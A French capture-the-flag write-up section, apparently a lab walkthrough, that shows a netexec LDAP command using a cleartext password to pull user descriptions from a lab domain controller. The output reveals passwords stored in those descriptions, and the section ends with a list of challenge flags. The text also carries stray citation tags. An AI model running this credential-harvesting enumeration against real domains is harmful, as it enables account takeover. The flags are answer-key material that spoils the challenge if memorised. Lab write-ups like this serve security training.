### 6. Énumération LDAP (Mots de passe dans les descriptions)

```text
❯   netexec ldap 10.13.37.42 -u j.vabre -p 'Coffee4me!' [cite: 107]
-M get-desc-users [cite: 108]

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:False) [cite: 108]
LDAP        10.13.37.42     389    DC-CELESTINA     [+] celestina.shop\j.vabre:Coffee4me! [cite: 108]
GET-DESC... 10.13.37.42     389    DC-CELESTINA     [+] Found following users:  [cite: 109]
GET-DESC... 10.13.37.42     389    DC-CELESTINA     User: Administrator description: Built-in account for administering the computer/domain [cite: 109]
GET-DESC... 10.13.37.42     389    DC-CELESTINA     User: Guest description: Built-in account for guest access to the computer/domain [cite: 109]
GET-DESC... 10.13.37.42     389    DC-CELESTINA     User: krbtgt description: Key Distribution Center Service Account [cite: 109]
GET-DESC... 10.13.37.42     389    DC-CELESTINA  [cite: 109]
    User: j.williams description: Th3Qu1ckBr0wnF0xJump! [cite: 110]
GET-DESC... 10.13.37.42     389    DC-CELESTINA     User: m.jones description: P4ssW0rd1zS3cur3&L0n9 [cite: 110]
GET-DESC... 10.13.37.42     389    DC-CELESTINA     User: s.ali description: 1ts4bR1Ght5uNNyDay! [cite: 110]
GET-DESC... 10.13.37.42     389    DC-CELESTINA     User: j.anderson description: 0hN0N0wW3H4veABl1zz! [cite: 111]
GET-DESC... 10.13.37.42     389    DC-CELESTINA     User: k.brown description: L3tsMak3S0m3C00k1es!! [cite: 112]
GET-DESC... 10.13.37.42     389    DC-CELESTINA     User: d.scrip description: ONeT0uGhP4ssW0rdT0CrAcK! [cite: 113]
GET-DESC... 10.13.37.42     389    DC-CELESTINA     User: k.cedepte description: R3m0t3Pr1v1l3g35@H4nd! [cite: 114]

```


CCHDFLM{WH47_3LS3_4m_1_R173_m473}
CCHDFLM{M0RE_c0ffEe_R045T_1n_mY_REp}
CCHDFLM{0H_n035_Y0U_F0uNd_my_LS4_S3cR3t}
CCHDFLM{cp4zzw0rd_15_N07_5ECURe_d4MN_Y0U_m1CR050f7}

PEUT ETRE 
CCHDFLM{0H_n035_Y0U_F0uNd_my_LS4_S3cR3t}
CCHDFLM{P07a70E5_90D}